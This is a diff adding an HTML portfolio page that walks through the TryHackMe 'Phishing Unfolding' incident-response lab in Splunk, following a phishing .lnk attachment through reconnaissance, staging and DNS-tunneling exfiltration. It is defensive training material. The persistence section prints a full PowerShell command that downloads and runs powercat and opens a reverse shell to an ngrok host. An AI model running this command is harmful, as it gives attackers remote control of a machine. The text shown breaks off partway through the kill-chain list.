@@ -1,0 +1,722 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <title>Phishing Unfolding</title>
+    <meta name="description" content="Case study page of Phising Unfolding" />
+    <link rel="stylesheet" href="css/style.css" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;600;700;900&display=swap" rel="stylesheet" />
+    <style>
+      .constrained-image {
+        display: block;
+        width: 100%;
+        height: auto;
+        cursor: pointer; /* Add a pointer cursor on hover */
+        transition: transform 0.2s ease;
+      }
+
+      .constrained-image.larger {
+        max-width: 1890px;
+        max-height: 1100px;
+      }
+
+      .constrained-image:hover {
+        transform: scale(1.03);
+      }
+
+      .project-details__img-cont {
+        margin-bottom: 2rem;
+        text-align: center;
+      }
+
+      /* The Modal (background) */
+      .modal {
+        display: none; /* Hidden by default */
+        position: fixed; /* Stay in place */
+        z-index: 1000; /* Sit on top */
+        left: 0;
+        top: 0;
+        width: 100%; /* Full width */
+        height: 100%; /* Full height */
+        overflow: auto; /* Enable scroll if needed */
+        background-color: rgba(0, 0, 0, 0.9); /* Black with opacity */
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+
+      /* Modal Content (image) */
+      .modal-content {
+        /* margin: auto; */
+        display: block;
+        /* width: 80%; */
+        max-width: 90%;
+        max-height: 90%;
+      }
+
+      /* Close Button */
+      .close {
+        position: absolute;
+        top: 15px;
+        right: 35px;
+        color: #f1f1f1;
+        font-size: 40px;
+        font-weight: bold;
+        transition: color 0.3s;
+        cursor: pointer;
+      }
+
+      .close:hover,
+      .close:focus {
+        color: #bbb;
+        text-decoration: none;
+      }
+      code {
+        background-color: #eee; /* Light background for code */
+        padding: 2px 4px;
+        border-radius: 3px;
+        font-family: 'Source Code Pro', monospace; /* Monospaced font for code */
+        font-size: 0.9em; /* Slightly smaller than surrounding text */
+      }
+    </style>
+  </head>
+  <body>
+    <header class="header">
+      <div class="header__content">
+        <div class="header__logo-container">
+          <a href="./index.html">
+            <div class="header__logo-img-cont">
+              <img src="./assets/png/john-doe.png" alt="Ram Maheshwari Logo Image" class="header__logo-img" />
+            </div>
+            <span class="header__logo-sub">HAN YETI</span>
+          </a>
+        </div>
+        <div class="header__main">
+          <ul class="header__links">
+            <li class="header__link-wrapper">
+              <a href="./index.html" class="header__link"> Home </a>
+            </li>
+            <li class="header__link-wrapper">
+              <a href="./index.html#about" class="header__link">About </a>
+            </li>
+            <li class="header__link-wrapper">
+              <a href="./index.html#projects" class="header__link">
+                Projects
+              </a>
+            </li>
+            <li class="header__link-wrapper">
+              <a href="./index.html#contact" class="header__link"> Contact </a>
+            </li>
+          </ul>
+          <div class="header__main-ham-menu-cont">
+            <img src="./assets/svg/ham-menu.svg" alt="hamburger menu" class="header__main-ham-menu" />
+            <img src="./assets/svg/ham-menu-close.svg" alt="hamburger menu close" class="header__main-ham-menu-close d-none" />
+          </div>
+        </div>
+      </div>
+      <div class="header__sm-menu">
+        <div class="header__sm-menu-content">
+          <ul class="header__sm-menu-links">
+            <li class="header__sm-menu-link">
+              <a href="./index.html"> Home </a>
+            </li>
+            <li class="header__sm-menu-link">
+              <a href="./index.html#about"> About </a>
+            </li>
+            <li class="header__sm-menu-link">
+              <a href="./index.html#projects"> Projects </a>
+            </li>
+            <li class="header__sm-menu-link">
+              <a href="./index.html#contact"> Contact </a>
+            </li>
+          </ul>
+        </div>
+      </div>
+    </header>
+    <section class="project-cs-hero">
+      <div class="project-cs-hero__content">
+        <h1 class="heading-primary">Phishing Unfolding</h1>
+        <div class="project-cs-hero__info">
+          <p class="text-primary">
+We are here to resolve the "Phishing Unfolding" room from TryHackMe. This project is all about walking through a real-world phishing incident from start to finish.          </p>
+        </div>
+      <!--  <div class="project-cs-hero__cta">
+          <a href="#" class="btn btn--bg" target="_blank">Live Link</a>
+        </div> -->
+      </div>
+    </section>
+    <section class="project-details">
+      <div class="main-container">
+        <div class="project-details__content">
+          <div class="project-details__showcase-img-cont">
+            <img src="./assets/jpeg/project-mockup-example.jpeg" alt="Project Image" class="project-details__showcase-img" />
+          </div>
+          <div class="project-details__content-main">
+            <div class="project-details__desc">
+              <h3 class="project-details__content-title">Overview</h3>
+              <p class="project-details__desc-para">
+We are here to resolve the "<code>Phishing Unfolding</code>" room from <code>TryHackMe</code>. This project is all about walking through a real-world phishing incident from start to finish. I'll be detailing my entire investigation process, from the moment a suspicious email alert popped up in our <code>SIEM</code>, right through to tracking the attacker's every move in <code>Splunk</code>. My goal here is to lay out how I approached this, what evidence I found, and how I pieced together the full attack chain to formulate a concrete remediation plan.            </div>
+            <div class="project-details__subsections">
+              <h3 class="project-details__content-title">Key Skills Demonstrated</h3>
+              <p class="project-details__desc-para">
+Cyber Kill Chain , Incident Response, Threat Hunting, Alert Triage, SIEM (Splunk), Log Analysis , Digital Forensics, Endpoint Analysis, Threat Intelligence, Understanding of TTPs, PowerShell Script Analysis, Network Analysis, Remediation and Mitigation Planning, 
+Regulatory Compliance Awareness, Documentation                                            </p>        
+              <h3 class="project-details__content-title">Suspicious Email Alert</h3>
+              <p class="project-details__desc-para">
+Here we can see the <code>SIEM</code> alert for a suspicious email. It includes an attachment named <code>ImportantInvoice-February.zip</code>, which was sent to <code>michael.ascot@tryhatme.com</code> from <code>john@hatmakereurope.xyz</code> with the subject "Important: Pending Invoice!". This email served as the initial entry point for the attack.              </p>
+              <div class="project-details__img-cont">
+                <img
+                  src="./assets/SocSim2/1-email.png"
+                  alt="Network Configuration Screenshot"
+                  class="constrained-image"
+                  id="image-2"
+                  onclick="showOriginal(this)"
+                />
+              </div>
+              <h3 class="project-details__content-title">Checking the Attachment</h3>
+              <p class="project-details__desc-para">
+After opening the <code>ImportantInvoice-February.zip</code> on the analyst VM, I saw the <code>invoice.pdf.lnk</code> file. Knowing that these shortcut files can be tricky and often hide malicious commands, my immediate thought was to grab its file hashes. I used <code>PowerShell</code> to get the <code>SHA256</code> and <code>MD5</code> hashes of <code>invoice.pdf.lnk</code>. This way, I can quickly check these hashes against threat intelligence platforms to see if anyone else has seen this file before and if it's known to be bad. It's a quick way to get some initial context.</p>              <div class="project-details__img-cont">
+                <img
+                  src="./assets/SocSim2/2-att.png"
+                  alt="Netplan Apply Screenshot"
+                  class="constrained-image"
+                  id="image-3"
+                  onclick="showOriginal(this)"
+                />
+              </div>
+              <h3 class="project-details__content-title">Initial Threat Intelligence Check</h3>
+              <p class="project-details__desc-para">
+So, after getting the hashes for <code>invoice.pdf.lnk</code>, I immediately popped these hashes into threat intelligence platforms. As you can see in the screenshot, it came back with no results in every search, meaning no one had reported this specific hash before. Now, it's really important to remember that just because a hash isn't found doesn't mean the file isn't malicious. This could just mean it's a very new variant, or perhaps it's highly targeted and hasn't been widely seen. It actually makes me even more suspicious, as attackers often try to generate unique hashes to evade detection. So, while this was a quick check, it certainly wasn't the end of my investigation.</p>
+              <div class="project-details__img-cont">
+                <img
+                  src="./assets/SocSim2/3-vt.png"
+                  alt="Mounting Shared Folder Screenshot"
+                  class="constrained-image"
+                  id="image-5"
+                  onclick="showOriginal(this)"
+                />
+              </div>
+              <h3 class="project-details__content-title">Spike in SIEM Alerts</h3>
+              <p class="project-details__desc-para">
+After that initial hash check, I headed back to the <code>SIEM</code> dashboard to see if anything else was popping up related to this incident. As you can see, there's a significant jump in alerts. Specifically, I'm seeing a lot of "<code>Suspicious Parent Child Relationship</code>" alerts, flagged as high severity processes</p>
+              <div class="project-details__img-cont">
+                <img
+                  src="./assets/SocSim2/4-dash.png"
+                  alt="Splunk Installation Screenshot"
+                  class="constrained-image"
+                  id="image-6"
+                  onclick="showOriginal(this)"
+                />
+              </div>
+              <h3 class="project-details__content-title">Investigating a High-Severity Alert: DNS Tunneling Spotted!</h3>
+              <p class="project-details__desc-para">
+Alright, so diving into those high-severity alerts, I picked one to investigate further, specifically alert ID <code>1036</code>, a "<code>Suspicious Parent Child Relationship</code>." The screenshot shows the detailed view of this alert. What immediately jumps out at me is that the <code>process.working_directory</code> points directly to <code>C:\Users\michael.ascot\downloads</code>. This pretty much confirms that these process alerts are highly likely related to the phishing email and the malicious attachment that <code>Michael Ascot</code> opened.</p>
+             <p class="project-details__desc-para"> 
+Looking closer at the <code>process.command_line</code>, I can see <code>nslookup.exe</code> being run with a suspicious-looking <code>base64</code> encoded string and <code>haz4rdw4re.io</code>. This is a huge red flag! <code>nslookup.exe</code> is a legitimate tool, but when it's being used this way, especially communicating with a suspicious domain, it often indicates <code>DNS tunneling</code>. This is a very stealthy way for attackers to exfiltrate data or establish command and control. The <code>process.parent.name</code> being <code>powershell.exe</code> also aligns perfectly with the incident report, which mentioned <code>PowerShell</code> being used for various stages of the attack, including data exfiltration via <code>DNS tunneling</code>. This alert is a smoking gun for the data exfiltration phase.</p>        
+              <div class="project-details__img-cont">
+                <img
+                  src="./assets/SocSim2/5-nslook.png"
+                  alt="Splunk Account Creation Screenshot"
+                  class="constrained-image"
+                  id="image-7"
+                  onclick="showOriginal(this)"
+                />
+              </div>
+        
+              <h3 class="project-details__content-title">Pivoting to Splunk: Focusing on the Compromised Host</h3>
+              <p class="project-details__desc-para">
+Given the critical alerts coming from <code>win-3450</code> and the clear indicators of compromise, it was time to move beyond the high-level alerts and really dig into the raw data. My next step was to pivot over to <code>Splunk</code>. My plan was to filter the logs specifically for the compromised host, <code>win-3450</code>, to see all activity originating from or targeting it.</p>
+              <div class="project-details__img-cont">
+                <img
+                  src="./assets/SocSim2/6-splunk.png"
+                  alt="Windows Event Log Inputs Configuration Screenshot"
+                  class="constrained-image"
+                  id="image-11"
+                  onclick="showOriginal(this)"
+                />
+              </div>
+      
+ 
+              <h3 class="project-details__content-title">Phishing Attachment Detected</h3>
+              <p class="project-details__desc-para">
+      Okay, so the first interesting log I pulled from <code>Splunk</code> after filtering for <code>win-3450</code> really ties back to the very beginning of the incident. This <code>sysmon</code> event, specifically <code>event.action: File created (rule: Filecreate)</code>, shows that the <code>ImportantInvoice-February.zip</code> file landed in <code>Michael Ascot</code>'s Outlook temporary internet cache.</p>
+              <p class="project-details__desc-para">
+  The <code>file.path: C:\Users\michael.ascot\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\R4WK02QB\ImportantInvoice-February.zip</code> clearly indicates it was an attachment from an email, and the <code>process.name: OUTLOOK.EXE</code> confirms it was received via Outlook. This log entry at <code>1:00:13.540 PM</code> (June 4, 2025) perfectly corroborates the initial <code>SIEM</code> alert we saw about the suspicious email. This is basically the system confirming the malicious <code>ZIP</code> file made it onto the host.</p>
+
+              <div class="project-details__img-cont">
+                <img
+                  src="./assets/SocSim2/7-email.png"
+                  alt="Splunk AD Server Logs Screenshot 0"
+                  class="constrained-image"
+                  id="image-15"
+                  onclick="showOriginal(this)"
+                />
+              </div>
+  
+              <h3 class="project-details__content-title">The LNK File is Extracted</h3>
+              <p class="project-details__desc-para">
+Following the initial email attachment, this <code>sysmon</code> event at <code>1:00:24.540 PM</code> tells me that <code>explorer.exe</code> (PID <code>3180</code>) created a file stream for <code>invoice.pdf.lnk</code>. This is a pretty significant step because it means the <code>invoice.pdf.lnk</code> file, which was inside that malicious <code>ZIP</code>, has now been extracted to a temporary folder: <code>C:\Users\michael.ascot\AppData\Local\Temp\5\Temp\_ImportantInvoice-Febrary.zip\ImportantInvoice-Febrary\invoice.pdf.lnk</code>. This extraction, initiated by <code>explorer.exe</code>, is very likely what happened right after <code>Michael Ascot</code> clicked on or opened the <code>ZIP</code> file. This is the moment the malicious <code>.lnk</code> file is actually on the file system and ready to be executed. This is the point where the initial payload is about to run!</p>
+              <div class="project-details__img-cont">
+                <img
+                  src="./assets/SocSim2/8-runthefile.png"
+                  alt="Installing Active Directory Domain Services Screenshot"
+                  class="constrained-image"
+                  id="image-20"
+                  onclick="showOriginal(this)"
+                />
+              </div>
+              
+                <h3 class="project-details__content-title">Initial Payload Execution and Reverse Shell Attempt!</h3>
+              <p class="project-details__desc-para">
+This log entry, just seconds after the <code>.lnk</code> file was extracted at <code>1:00:25.540 PM</code>, is exactly what I was looking for. It's a <code>sysmon Process Create</code> event, showing <code>explorer.exe</code> (PID <code>3180</code>) spawning <code>powershell.exe</code> (PID <code>3880</code>). This confirms that clicking the <code>invoice.pdf.lnk</code> file directly led to <code>PowerShell</code> being executed.</p>
+              <p class="project-details__desc-para">
+But the real kicker is the <code>process.command_line</code>. It's a classic malicious <code>PowerShell</code> one-liner: it uses <code>IEX (New-Object System.Net.WebClient).DownloadString()</code> to pull <code>powermac.ps1</code> from a <code>GitHub</code> repository (<code>https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1</code>). Immediately after that, it attempts to establish a <code>reverse shell</code> connection using <code>powercat</code> – which is a <code>PowerShell</code> version of <code>Netcat</code>, used for network debugging and creating reverse shells – to <code>2.tcp.ngrok.io</code> on port <code>19282</code>. This is the attacker getting their initial foothold and trying to set up remote access. This log unequivocally confirms the initial compromise described in the incident report!</p>
+              <div class="project-details__img-cont">
+                <img
+                  src="./assets/SocSim2/9-powercat.png"
+                  alt="Splunk AD Server Logs Screenshot 0"
+                  class="constrained-image"
+                  id="image-21"
+                  onclick="showOriginal(this)"
+                />
+              </div>
+
+                <h3 class="project-details__content-title">Initial Reconnaissance</h3>
+              <p class="project-details__desc-para">
+These next couple of <code>sysmon Process Create</code> events tell me the attacker is starting their reconnaissance. Both of these processes are spawned by <code>powershell.exe</code> (PID <code>9060</code>), which is the attacker's initial shell on the system.</p>
+              <p class="project-details__desc-para">
+The first log, at <code>1:00:49.540 PM</code>, shows <code>whoami.exe</code> being executed. This is a super common first step for an attacker – they want to know what user context they're operating under on the compromised machine. It's their way of figuring out their current privileges.</p>
+              <p class="project-details__desc-para">
+Then, just a few seconds earlier at <code>1:00:41.540 PM</code>, I see <code>systeminfo.exe</code> being run. This command provides detailed configuration information about the operating system, hardware, and installed hotfixes. Attackers use this to understand the system's patching level, potential vulnerabilities, and overall environment.</p>
+              <p class="project-details__desc-para">
+Combined, these two commands clearly indicate the attacker is actively gathering information about the <code>win-3450</code> host. They're trying to map out the environment and see what they've landed on, which is a classic move in the reconnaissance phase of an attack.</p>
+     
+              <div class="project-details__img-cont">
+                <img
+                  src="./assets/SocSim2/10-recon.png"
+                  alt="Splunk AD Server Logs Screenshot 0"
+                  class="constrained-image"
+                  id="image-22"
+                  onclick="showOriginal(this)"
+                />
+              </div>
+
+              <h3 class="project-details__content-title">PowerView.ps1 Downloaded</h3>
+              <p class="project-details__desc-para">
+At <code>1:01:36.540 PM</code>, I found a <code>sysmon FileCreate</code> event showing <code>PowerView.ps1</code> being downloaded to <code>C:\Users\michael.ascot\Downloads\PowerView.ps1</code>. This file was created by <code>powershell.exe</code> (PID <code>9060</code>), which we know is the attacker's reverse shell session.</p>
+              <p class="project-details__desc-para">
+<code>PowerView.ps1</code> is a well-known <code>PowerShell</code> script from the <code>PowerSploit</code> framework, specifically designed for <code>Active Directory</code> reconnaissance. Attackers love it because it helps them enumerate users, groups, computers, and other <code>Active Directory</code> objects to find valuable targets and understand the network's layout. This definitely confirms the attacker is systematically gathering information about the environment, looking for juicy targets or privileged accounts to compromise. This is a very common tool in advanced attacks.</p>
+              <div class="project-details__img-cont">
+                <img
+                  src="./assets/SocSim2/11-pview.png"
+                  alt="Splunk AD Server Logs Screenshot 0"
+                  class="constrained-image"
+                  id="image-23"
+                  onclick="showOriginal(this)"
+                />
+              </div>
+
+              <h3 class="project-details__content-title">PowerShell Execution Policy Bypass</h3>
+              <p class="project-details__desc-para">
+Here the attacker is attempting to bypass <code>PowerShell</code>'s execution policy. Normally, <code>PowerShell</code> has security policies in place to prevent unsigned or untrusted scripts from running. By setting <code>ExecutionPolicy Bypass</code>, they're essentially telling <code>PowerShell</code>, "just run whatever I give you, don't worry about the security checks." This is a common tactic for attackers to ensure their malicious scripts, like <code>PowerView.ps1</code> or the <code>reverse shell</code>, can execute freely on the compromised system without being blocked by these built-in security features. It's a clear sign of malicious intent and preparatory steps for further actions.</p>
+              <div class="project-details__img-cont">
+                <img
+                  src="./assets/SocSim2/12-bypass.png"
+                  alt="Installing Active Directory Domain Services Screenshot"
+                  class="constrained-image"
+                  id="image-24"
+                  onclick="showOriginal(this)"
+                />
+              </div>
+
+              <h3 class="project-details__content-title">PowerView.ps1 Execution</h3>
+              <p class="project-details__desc-para">
+Here I see that the <code>PowerView.ps1</code> script, which the attacker downloaded earlier, is now being executed on <code>win-3450</code>. The <code>message</code> and <code>powershell.file.script_block_text</code> might look a bit obfuscated with the <code>Reflection.Emit.ModuleBuilder</code> and <code>Reflection.Assembly</code> calls, but this is a common way <code>PowerShell</code> scripts, especially sophisticated ones like <code>PowerView</code>, are invoked. It's essentially running the script in memory to avoid leaving direct command-line traces. The <code>winlog.process.pid: 3728</code> indicates the <code>PowerShell</code> process that's running it. This is the attacker actively performing network reconnaissance, likely enumerating <code>Active Directory</code> to find valuable targets like file servers or domain controllers. They're mapping out the environment and looking for the data they want to steal.</p>
+              <div class="project-details__img-cont">
+                <img
+                  src="./assets/SocSim2/13-pw.png"
+                  alt="Installing Active Directory Domain Services Screenshot"
+                  class="constrained-image"
+                  id="image-25"
+                  onclick="showOriginal(this)"
+                />
+              </div>
+
+              <h3 class="project-details__content-title">PowerView's Reconnaissance Actions</h3>
+              <p class="project-details__desc-para">
+This <code>powershell</code> event is still showing <code>PowerView.ps1</code> in action. While the previous log confirmed its execution, this one gives us a glimpse into the actual code or script block it's running. The <code>message</code> and <code>powershell.file.script_block_text</code> show functions like <code>Test-Connection</code> (which is like pinging) and <code>LDAPProperty</code>.</p>
+              <p class="project-details__desc-para">
+This confirms that <code>PowerView.ps1</code> isn't just sitting there; it's actively trying to identify and enumerate hosts on the network, likely through pinging, and then querying <code>Active Directory</code> (using <code>LDAP</code>) to gather details about these systems. It's looking for hostnames, properties, and generally mapping out the network environment. This is exactly what a reconnaissance tool does – preparing the attacker for the next phase, which is typically identifying valuable data or further targets. The <code>process.pid: 3728</code> confirms it's the same <code>PowerShell</code> process we saw executing <code>PowerView</code> earlier. They're definitely looking for something specific now.</p>
+              <div class="project-details__img-cont">
+                <img
+                  src="./assets/SocSim2/14-ldap.png"
+                  alt="Splunk AD Server Logs Screenshot 0"
+                  class="constrained-image"
+                  id="image-26"
+                  onclick="showOriginal(this)"
+                />
+              </div>
+
+              <h3 class="project-details__content-title">Network Share Mapped: Accessing Financial Records!</h3>
+              <p class="project-details__desc-para">
+Here we see that the attacker, still using the same <code>powershell.exe</code> process (PID <code>3728</code>) that was running <code>PowerView</code>, has just created a new directory named <code>exfiltration</code> within <code>Michael Ascot</code>'s Downloads folder. This is a classic staging area. Attackers often create a dedicated folder to collect all the sensitive data they plan to steal before they actually send it out. This confirms that the attacker has completed their reconnaissance and is now moving into the data staging (the attacker prepares the data for exfiltration) phase, getting ready for exfiltration. This is a very critical step in the attack chain.</p>
+              <div class="project-details__img-cont">
+                <img
+                  src="./assets/SocSim2/16-financialr.png"
+                  alt="Installing Active Directory Domain Services Screenshot"
+                  class="constrained-image"
+                  id="image-26"
+                  onclick="showOriginal(this)"
+                />
+              </div>
+
+              <h3 class="project-details__content-title">Data Copied to Exfiltration Folder via Robocopy</h3>
+              <p class="project-details__desc-para">
+These two <code>sysmon FileCreate</code> events are the definitive proof of data theft to the staging directory. We can see two files being created within our previously identified <code>exfiltration</code> folder:</p>
+              <p class="project-details__desc-para">
+<code>C:\Users\michael.ascot\Downloads\exfiltration\InvestorPresentation2023.pptx</code><br><code>C:\Users\michael.ascot\Downloads\exfiltration\ClientPortfolioSummary.xlsx</code></p>
+              <p class="project-details__desc-para">
+I can also see that the attacker is using <code>Robocopy</code>, a robust Windows utility for copying files and directories. It's often favored by attackers because it's built-in, versatile, and can handle large transfers efficiently.</p>
+              <div class="project-details__img-cont">
+                <img
+                  src="./assets/SocSim2/17-twomore.png"
+                  alt="Splunk AD Server Logs Screenshot 0"
+                  class="constrained-image"
+                  id="image-27"
+                  onclick="showOriginal(this)"
+                />
+              </div>
+
+              <h3 class="project-details__content-title">Robocopy Command Confirmed</h3>
+              <p class="project-details__desc-para">
+Here we can see this command tells <code>Robocopy</code> to copy files to the <code>C:\Users\michael.ascot\downloads\exfiltration</code> directory. The <code>/E</code> flag is interesting because it means "copy subdirectories, including empty ones," suggesting the attacker might have intended to copy more than just the two files we saw, or was being thorough.</p>
+              <div class="project-details__img-cont">
+                <img
+                  src="./assets/SocSim2/18-copy.png"
+                  alt="Installing Active Directory Domain Services Screenshot"
+                  class="constrained-image"
+                  id="image-28"
+                  onclick="showOriginal(this)"
+                />
+              </div>
+
+              <h3 class="project-details__content-title">Network Share Disconnected</h3>
+              <p class="project-details__desc-para">
+Here I found a <code>sysmon Process Create</code> event that shows the command <code>C:\Windows\system32\net.exe use Z: /delete</code>. This is another <code>net.exe</code> command, but this time with the <code>/delete</code> flag, executed again by <code>powershell.exe</code> (PID <code>3728</code>).</p>
+              <p class="project-details__desc-para">
+What this means is that immediately after copying the files from the <code>SSF-FinancialRecords</code> network share to the local <code>exfiltration</code> directory, the attacker is now disconnecting the <code>Z:</code> drive mapping. This is a common defensive evasion tactic. By disconnecting the network share, they are trying to remove a direct link to the source of the stolen data, making it slightly harder to trace their activity back to the file server if an analyst were to look at active network connections. It's a quick cleanup step after they've gotten what they needed.</p>
+              <div class="project-details__img-cont">
+                <img
+                  src="./assets/SocSim2/19-disconnect.png"
+                  alt="Splunk AD Server Logs Screenshot 0"
+                  class="constrained-image"
+                  id="image-29"
+                  onclick="showOriginal(this)"
+                />
+              </div>
+
+              <h3 class="project-details__content-title">Staged Data Compressed into exfilt8me.zip</h3>
+              <p class="project-details__desc-para">
+This is a crucial step in the data theft process. The attacker, still operating under the <code>powershell.exe</code> process (PID <code>3728</code>), has now taken the sensitive files they copied into the <code>exfiltration</code> folder and compressed them into a <code>ZIP</code> archive named <code>exfilt8me.zip</code>. Compressing data makes it much easier and faster to exfiltrate, especially when dealing with multiple files or large datasets, and it can also help to reduce the chances of detection by some network monitoring tools. This confirms they are now fully prepared for the actual data exfiltration.</p>
+              <div class="project-details__img-cont">
+                <img
+                  src="./assets/SocSim2/20-exfiltr8.png"
+                  alt="Installing Active Directory Domain Services Screenshot"
+                  class="constrained-image"
+                  id="image-30"
+                  onclick="showOriginal(this)"
+                />
+              </div>
+
+              <h3 class="project-details__content-title">Data Exfiltration via DNS Tunneling Confirmed!</h3>
+              <p class="project-details__desc-para">
+Here when we're looking closely, the message shows a complex <code>PowerShell</code> command that essentially reads the <code>exfilt8me.zip</code> file (which contains our stolen financial data!) using <code>[System.IO.File]::ReadAllBytes()</code>, then converts it to <code>Base64</code> using <code>[System.Convert]::ToBase64String()</code>. After that, it splits the <code>Base64</code> string into chunks and, crucially, uses <code>nslookup</code> to send each chunk to <code>haz4rdw4re.io</code>. The attacker is encoding the sensitive data and sending it out in small pieces through <code>DNS</code> queries, which can often bypass traditional firewalls and intrusion detection systems because <code>DNS</code> traffic is typically allowed.</p>
+              <p class="project-details__desc-para">
+This is the definitive evidence of <code>DNS tunneling</code> in action. The attacker is encoding the stolen <code>exfilt8me.zip</code> data and sending it out of our network in small pieces disguised as legitimate <code>DNS</code> queries to their controlled domain, <code>haz4rdw4re.io</code>. This is a highly stealthy way to exfiltrate data and bypass traditional firewalls. This log confirms the data breach is successful.</p>
+              <div class="project-details__img-cont">
+                <img
+                  src="./assets/SocSim2/21-transfer.png"
+                  alt="Splunk AD Server Logs Screenshot 0"
+                  class="constrained-image"
+                  id="image-31"
+                  onclick="showOriginal(this)"
+                />
+              </div>
+
+              <h3 class="project-details__content-title">Continued DNS Exfiltration</h3>
+              <p class="project-details__desc-para">
+Here we can notice that the continued use of <code>haz4rdw4re.io</code> as the target domain. However, the <code>base64</code> encoded strings preceding <code>haz4rdw4re.io</code> are different in each log. This is precisely how <code>DNS tunneling</code> works: the attacker breaks the exfiltrated file (in our case, <code>exfilt8me.zip</code>) into smaller chunks, <code>base64</code> encodes each chunk, and then sends them one by one as subdomains in <code>DNS</code> queries to their controlled server.</p>
+              <p class="project-details__desc-para">
+These multiple <code>nslookup</code> calls with varying <code>base64</code> strings confirm that the data exfiltration is an ongoing process, with the attacker diligently sending the stolen financial data out of our network in a segmented and stealthy manner. This is definitely the data breach in full swing.</p>
+              <div class="project-details__img-cont">
+                <img
+                  src="./assets/SocSim2/22-dnstunneling.png"
+                  alt="Splunk AD Server Logs Screenshot 0"
+                  class="constrained-image"
+                  id="image-32"
+                  onclick="showOriginal(this)"
+                />
+              </div>
+
+              <h3 class="project-details__content-title">Persistence Attempt and Initial Cleanup</h3>
+              <p class="project-details__desc-para">
+This <code>powershell</code> event, at <code>1:05:41.540 PM</code>, is incredibly important. It shows the attacker attempting to establish persistence and then trying to cover their tracks.</p>
+              <p class="project-details__desc-para">
+Looking at the <code>process.command_line</code>, it's the familiar malicious <code>PowerShell</code> command we saw at the beginning: <code>powershell.exe -IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell</code>. This is the attacker trying to re-download <code>powermac.ps1</code> and establish another <code>reverse shell</code> connection to <code>2.tcp.ngrok.io</code> on port <code>19282</code>. This is a clear attempt to create a backdoor or <code>reverse shell</code> to ensure they can regain access to <code>win-3450</code> later, even if their initial session is lost.</p>
+             <p class="project-details__desc-para">
+However, the message also contains <code>Stop-Process</code>. This indicates that immediately after (or alongside) this persistence attempt, the attacker is also trying to gracefully terminate their <code>PowerShell</code> process. This is a common defense evasion tactic, as shutting down their processes can make it harder for security tools or analysts to detect ongoing malicious activity. It's an attempt at cleanup, even while trying to maintain future access. This log shows the attacker trying to solidify their future access while minimizing immediate traces.</p>
+ 
+              <div class="project-details__img-cont">
+                <img
+                  src="./assets/SocSim2/23-backdoor.png"
+                  alt="Splunk AD Server Logs Screenshot 0"
+                  class="constrained-image"
+                  id="image-33"
+                  onclick="showOriginal(this)"
+                />
+              </div>
+
+<!--- ********************************* --->
+
+<h3 class="project-details__content-title">Cyber Kill Chain Analysis of the <code>win-3450</code> Phising Incident</h3>
+<p class="project-details__desc-para">Alright, let's map out this whole incident using the classic <code>Cyber Kill Chain</code> framework. This helps me organize the attack and identify key points where we could have, or can still, implement defenses.</p>
+
+<ol>
+    <li>
+        <h4 class="project-details__content-title">1. Reconnaissance:</h4>
+        <p class="project-details__desc-para">What Happened: The attacker performed initial reconnaissance to identify <code>michael.ascot@tryhatme.com</code> as a suitable target for their phishing campaign. (While we don't have direct logs for this external recon, the targeted nature of the email implies it.)</p>
+        <p class="project-details__desc-para">Our Evidence: The phishing email itself, specifically its recipient.</p>
+    </li>
+    <li>
+        <h4 class="project-details__content-title">2. Weaponization:</h4>
+        <p class="project-details__desc-para">What Happened: The adversary created <code>ImportantInvoice-February.zip</code> containing <code>invoice.pdf.lnk</code>, which was crafted to execute a malicious <code>PowerShell</code> command (downloading <code>powermac.ps1</code>).</p>
+        <p class="project-details__desc-para">Our Evidence: The identification of <code>invoice.pdf.lnk</code> within the <code>ZIP</code>, and its subsequent analysis showing the embedded <code>PowerShell</code>.</p>
+    </li>
+    <li>
+        <h4 class="project-details__content-title">3. Delivery:</h4>
+        <p class="project-details__desc-para">What Happened: The weaponized <code>ImportantInvoice-February.zip</code> was delivered to <code>michael.ascot@tryhatme.com</code> via an email.</p>
+        <p class="project-details__desc-para">Our Evidence: The initial <code>SIEM</code> email alert (<code>06/04/2025 13:40:06.540</code>) and the <code>Splunk</code> log showing the <code>ZIP</code> file landing in <code>michael.ascot</code>'s <code>Outlook</code> cache (<code>06/04/2025 14:00:13.540</code>).</p>
+    </li>
+    <li>
+        <h4 class="project-details__content-title"> 4. Exploitation:</h4>
+        <p class="project-details__desc-para">What Happened: <code>Michael Ascot</code> interacted with the malicious attachment, causing <code>invoice.pdf.lnk</code> to be extracted and executed, which then launched a <code>PowerShell</code> process.</p>
+        <p class="project-details__desc-para">Our Evidence:</p>
+        <ul>
+            <li class="project-details__desc-para"><code>invoice.pdf.lnk</code>'s presence after opening the <code>ZIP</code> (my analyst <code>VM</code> observation and hash check).</li>
+            <li class="project-details__desc-para"><code>Splunk</code> log: <code>File Stream Created</code> for <code>invoice.pdf.lnk</code> (<code>06/04/2025 1:00:24.540 PM</code>).</li>
+            <li class="project-details__desc-para"><code>Splunk</code> log: <code>Process Create</code> where <code>explorer.exe</code> spawned <code>powershell.exe</code> with the malicious download command (<code>06/04/2025 1:00:25.540 PM</code>).</li>
+        </ul>
+    </li>
+    <li>
+        <h4 class="project-details__content-title">5. Installation:</h4>
+        <p class="project-details__desc-para">What Happened: The attacker installed a backdoor, attempting to establish a persistent <code>reverse shell</code> connection to <code>2.tcp.ngrok.io</code> by downloading and executing <code>powermac.ps1</code> (<code>Powercat</code>).</p>
+        <p class="project-details__desc-para">Our Evidence: <code>Splunk</code> log: The <code>Process Create</code> for <code>PowerShell</code> showing the <code>IEX</code> command to download <code>powermac.ps1</code> and initiate the <code>powercat</code> connection (<code>06/04/2025 1:00:25.540 PM</code>).</p>
+    </li>
+    <li>
+        <h4 class="project-details__content-title">6. Command and Control (C2):</h4>
+        <p class="project-details__desc-para">What Happened: The attacker maintained remote access and control over <code>win-3450</code> endpoint through the established <code>reverse shell</code> connection to <code>2.tcp.ngrok.io</code>.</p>
+        <p class="project-details__desc-para">Our Evidence:</p>
+        <ul>
